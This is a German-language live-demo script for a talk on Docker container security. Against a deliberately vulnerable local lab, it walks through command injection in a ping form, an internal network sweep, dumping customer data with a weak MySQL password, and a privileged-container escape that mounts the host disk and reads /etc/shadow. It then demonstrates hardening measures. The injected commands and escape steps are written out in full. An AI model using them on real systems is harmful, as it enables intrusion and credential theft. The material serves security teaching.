# =============================================================
#  DEMO-DREHBUCH: Docker Container Security
#  Befehle zum Abtippen in der Live-Demo
# =============================================================

# ============================================
#  SETUP (vor der Präsentation ausführen!)
# ============================================

cd docker-security-demo
docker compose up -d --build
# Warte ca. 30 Sekunden bis MySQL bereit ist
sleep 30
# Teste: http://localhost:5000 im Browser öffnen


# ============================================
#  SCHRITT 1: Command Injection (Einstieg)
# ============================================

# Im Browser http://localhost:5000 öffnen
# Normaler Ping-Test:
#   Eingabe: 8.8.8.8
#   → Zeigt normales Ping-Ergebnis

# Jetzt Command Injection:
#   Eingabe: 8.8.8.8; whoami
#   → Zeigt "root" → Wir sind Root im Container!

# Mehr Informationen sammeln:
#   Eingabe: 8.8.8.8; cat /etc/os-release
#   → Zeigt das Betriebssystem

# Sind wir in einem Container?
#   Eingabe: 8.8.8.8; cat /proc/1/cgroup
#   → Zeigt "docker" → Bestätigt: Wir sind im Container


# ============================================
#  SCHRITT 2: Lateral Movement
# ============================================

# Netzwerk scannen - welche anderen Container gibt es?
#   Eingabe: 8.8.8.8; cat /etc/hosts
#   → Zeigt die eigene IP

# Andere Container im Netz finden:
#   Eingabe im Ping-Feld:
;for i in 1 2 3 4 5 6 7 8 9 10; do ping -c 1 -W 1 172.18.0.$i 2>/dev/null && echo "HOST FOUND: 172.18.0.$i"; done

# HINWEIS: Die IPs können variieren! Schau welche antworten.
# Typischerweise:
#   172.18.0.2 = db
#   172.18.0.3 = admin
#   172.18.0.4 = webapp

# Admin-Service entdecken und abfragen:
#   Eingabe:
; curl -s http://admin:8080/api/config

#   → Zeigt API-Keys und Admin-Zugangsdaten!
#   (Der Service "admin" ist per Docker-DNS erreichbar)

# Datenbank angreifen mit schwachem Passwort:
#   Eingabe:
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"

#   → Zeigt alle Kundendaten inkl. Kreditkarten!


# ============================================
#  SCHRITT 3: Container Escape
# ============================================

# Prüfen ob wir im privilegierten Modus sind:
#   Eingabe:
; fdisk -l 2>/dev/null | head -5

#   → Wenn Festplatten angezeigt werden = privilegiert!

# Host-Dateisystem mounten:
#   Eingabe:
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/

# HINWEIS: Das Device kann variieren (sda1, vda1, xvda1...)
# Alternative mit lsblk:
; lsblk

#   → Zeigt verfügbare Blockdevices
#   → Device-Name merken und im mount-Befehl verwenden

# Host-Dateien lesen:
; cat /mnt/host/etc/hostname
; cat /mnt/host/etc/shadow | head -3

#   → Wir können das gesamte Host-System lesen!
#   → GAME OVER - vollständiger Ausbruch aus dem Container


# ============================================
#  HÄRTUNG DEMONSTRIEREN
# ============================================

# Vulnerable Version stoppen
docker compose down

# Gehärtete Version starten
docker compose -f docker-compose.hardened.yml up -d --build
sleep 10

# Im Browser http://localhost:5000 öffnen (grünes Design = gehärtet)

# Command Injection versuchen:
#   Eingabe: 8.8.8.8; whoami
#   → "Ungültige Eingabe!" - Input-Validierung greift!

# Selbst wenn jemand reinkäme (anderer Weg):
docker compose -f docker-compose.hardened.yml exec webapp sh
# → whoami zeigt "appuser" statt "root"
# → fdisk -l → keine Berechtigung
# → mount → keine Berechtigung (kein SYS_ADMIN)
# → curl admin:8080 → Netzwerk nicht erreichbar (Netzwerk-Segmentierung)

# Aufräumen
docker compose -f docker-compose.hardened.yml down


# ============================================
#  ZUSAMMENFASSUNG DER HÄRTUNGSMASSNAHMEN
# ============================================
#
# 1. Input-Validierung    → Verhindert Command Injection
# 2. Non-Root User        → Minimale Rechte im Container
# 3. Kein --privileged    → Kein Zugriff auf Host-Devices
# 4. cap_drop: ALL        → Keine Linux Capabilities
# 5. no-new-privileges    → Keine Rechteeskalation
# 6. Netzwerk-Segmentierung → Webapp kann DB/Admin nicht erreichen
# 7. read_only Filesystem → Keine Dateien schreibbar
# 8. Starke Passwörter    → Kein einfaches Erraten
